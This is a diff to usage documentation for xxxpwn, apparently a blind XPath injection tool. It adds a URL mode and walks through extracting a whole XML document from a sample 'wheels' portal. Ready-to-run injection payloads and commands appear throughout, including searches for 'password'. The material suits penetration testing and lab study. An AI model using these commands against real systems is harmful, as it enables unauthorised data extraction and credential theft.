@@ -11,16 +11,8 @@ narrows down the answer with each request.
 
 Target: `http://wheels/portal.php?work=car&action=search`
 
-The `work` parameter is injectable. A normal request looks like:
-
-```
-GET /portal.php?work=car&action=search HTTP/1.1
-Host: wheels
-
-```
-
-To inject, you need to break out of the current XPath string context and append
-your own boolean expression. A typical GET parameter injection suffix is:
+The `work` parameter is injectable. To inject, you need to break out of the
+current XPath string context and append your own boolean expression:
 
 ```
 ' or INJECT and '1'='1
@@ -30,7 +22,43 @@ Substituting `INJECT` with something always-true (`1=1`) should produce the same
 response as a valid search. Substituting something always-false (`0=1`) should
 produce a different response (empty result, error, redirect, etc.).
 
-### 1. Create the inject file
+There are two ways to run xxxpwn: **URL mode** (quick) and **inject file mode**
+(full control).
+
+---
+
+### URL mode (quickstart)
+
+Pass the target URL with `$INJECT` placed directly in the parameter value.
+xxxpwn derives the host, port, and SSL settings automatically — no inject file
+needed.
+
+```bash
+xxxpwn --url "http://wheels/portal.php?work=car'+or+$INJECT+and+'1'='1&action=search" \
+       -m "result"
+```
+
+`$INJECT` is the placeholder xxxpwn replaces on every request.
+The `+` signs are URL-encoded spaces (required for GET parameters).
+
+For HTTPS, just use `https://` — SSL is detected from the scheme:
+
+```bash
+xxxpwn --url "https://wheels/portal.php?work=car'+or+$INJECT+and+'1'='1&action=search" \
+       -m "result"
+```
+
+> **Note:** `--url` cannot be combined with `-i`/`--inject`, `-s`/`--ssl`,
+> or the positional `host`/`port` args — they are all derived from the URL.
+
+---
+
+### Inject file mode (full control)
+
+Use this when you need to inject into a POST body, SOAP envelope, custom
+headers, or anywhere a raw URL won't cut it.
+
+#### 1. Create the inject file
 
 Save this as `inject_wheels.txt`:
 
@@ -40,13 +68,18 @@ Host: wheels
 
 ```
 
-`$INJECT` is the placeholder xxxpwn replaces on every request.
-The `+` signs are URL-encoded spaces (required for GET parameters).
+#### 2. Run
+
+```bash
+xxxpwn -i inject_wheels.txt -m "result" wheels 80
+```
 
 > **Note:** If the parameter is URL-decoded before XPath evaluation you may need
 > `-U` to URL-encode the injected payload as well. Test both.
 
-### 2. Find your match string
+---
+
+### Find your match string
 
 Run a normal request in your browser or with curl and identify a string that
 appears in the **successful** response but not in an error/empty response.
@@ -56,13 +89,9 @@ For example, if a successful search returns a page containing the word `result`:
 -m "result"
 ```
 
-### 3. Verify the injection point
+### Sanity checks
 
-```bash
-xxxpwn -i inject_wheels.txt -m "result" wheels 80
-```
-
-xxxpwn automatically runs two sanity checks before doing anything:
+xxxpwn automatically runs two checks before doing anything:
 
 | Test | XPath injected | Expected |
 |------|---------------|----------|
@@ -73,32 +102,27 @@ If either check fails, xxxpwn exits with an error. Common fixes:
 
 - Add `-U` if the parameter is double-encoded
 - Add `-H` if the payload is in an HTML/XML body (e.g. SOAP)
-- Adjust the injection syntax in your inject file
+- Adjust the injection syntax in your URL or inject file
 
-### 4. Dump the full XML document
+### Dump the full XML document
 
-```bash
-xxxpwn -i inject_wheels.txt -m "result" wheels 80
-```
-
-xxxpwn walks the entire XML tree and prints it incrementally to stdout as it
-discovers it, then pretty-prints the full document at the end.
+Both modes walk the entire XML tree and print it incrementally to stdout,
+then pretty-print the full document at the end.
 
 ---
 
 ## Common scenarios
-
-### HTTPS target
-
-```bash
-xxxpwn -s -i inject_wheels.txt -m "result" wheels 443
-```
 
 ### Speed up extraction with threads
 
 Each thread finds one character concurrently. 4–8 threads is a good starting point.
 
 ```bash
+# URL mode
+xxxpwn --url "http://wheels/portal.php?work=car'+or+$INJECT+and+'1'='1&action=search" \
+       -m "result" -t 4
+
+# Inject file mode
 xxxpwn -t 4 -i inject_wheels.txt -m "result" wheels 80
 ```
 
@@ -107,8 +131,10 @@ xxxpwn -t 4 -i inject_wheels.txt -m "result" wheels 80
 Useful when you already know what you're looking for (usernames, passwords, etc.).
 
 ```bash
+xxxpwn --url "http://wheels/portal.php?work=car'+or+$INJECT+and+'1'='1&action=search" \
+       -m "result" --search "password"
+
 xxxpwn --search "password" -i inject_wheels.txt -m "result" wheels 80
-xxxpwn --search "admin"    -i inject_wheels.txt -m "result" wheels 80
 ```
 
 Returns every node name, attribute name, attribute value, comment, and text node
@@ -118,13 +144,18 @@ that contains the search string.
 
 If the endpoint requires authentication:
 
-```bash
+```
 # cookies.txt
 PHPSESSID=abc123
 auth=bearer_token_here
 ```
 
 ```bash
+# URL mode
+xxxpwn --url "http://wheels/portal.php?work=car'+or+$INJECT+and+'1'='1&action=search" \
+       -m "result" -C cookies.txt
+
+# Inject file mode
 xxxpwn -C cookies.txt -i inject_wheels.txt -m "result" wheels 80
 ```
 
@@ -136,6 +167,9 @@ the document and shrinks the BST search space. `-x` matches node names against
 previously seen names instead of re-extracting them character by character.
 
 ```bash
+xxxpwn --url "http://wheels/portal.php?work=car'+or+$INJECT+and+'1'='1&action=search" \
+       -m "result" -gnox -t 4
+
 xxxpwn -gnox -t 4 -i inject_wheels.txt -m "result" wheels 80
 ```
 
@@ -153,6 +187,9 @@ character set and use XPath `translate()` for comparisons — roughly halves the
 number of requests:
 
 ```bash
+xxxpwn --url "http://wheels/portal.php?work=car'+or+$INJECT+and+'1'='1&action=search" \
+       -m "result" -l
+
 xxxpwn -l -i inject_wheels.txt -m "result" wheels 80
 ```
 
@@ -161,6 +198,9 @@ xxxpwn -l -i inject_wheels.txt -m "result" wheels 80
 If you already know part of the tree structure:
 
 ```bash
+xxxpwn --url "http://wheels/portal.php?work=car'+or+$INJECT+and+'1'='1&action=search" \
+       -m "result" --start_node "/*[1]/*[2]"
+
 xxxpwn --start_node "/*[1]/*[2]" -i inject_wheels.txt -m "result" wheels 80
 ```
 
@@ -169,6 +209,9 @@ xxxpwn --start_node "/*[1]/*[2]" -i inject_wheels.txt -m "result" wheels 80
 Use `-e` to fire a single injection and see the full request/response:
 
 ```bash
+xxxpwn --url "http://wheels/portal.php?work=car'+or+$INJECT+and+'1'='1&action=search" \
+       -m "result" -e "1=1"
+
 xxxpwn -e "1=1" -i inject_wheels.txt -m "result" wheels 80
 xxxpwn -e "0=1" -i inject_wheels.txt -m "result" wheels 80
 ```
@@ -200,14 +243,20 @@ xxxpwn automatically recalculates `Content-Length` on every request.
 ## Full flag reference
 
 ```
-xxxpwn [OPTIONS] <HOST> <PORT>
+xxxpwn [OPTIONS] [HOST] [PORT]
+
+Input (one of these two forms required):
+  --url <URL>              Full URL with $INJECT in the target parameter.
+                           Derives host, port, and SSL from the URL.
+                           Cannot be combined with -i, -s, host, or port.
+  -i, --inject <FILE>      Raw HTTP request template with $INJECT placeholder.
+                           Requires host and port positional args.
 
 Required:
-  -i, --inject <FILE>      Inject template file (must contain $INJECT)
   -m, --match  <PATTERN>   Regex matched against the response to detect true
 
 Connection:
-  -s, --ssl                Use TLS
+  -s, --ssl                Use TLS (inject file mode only; auto-detected with --url)
   -C, --cookies <FILE>     Cookie file (one name=value per line, # for comments)
 
 Encoding:
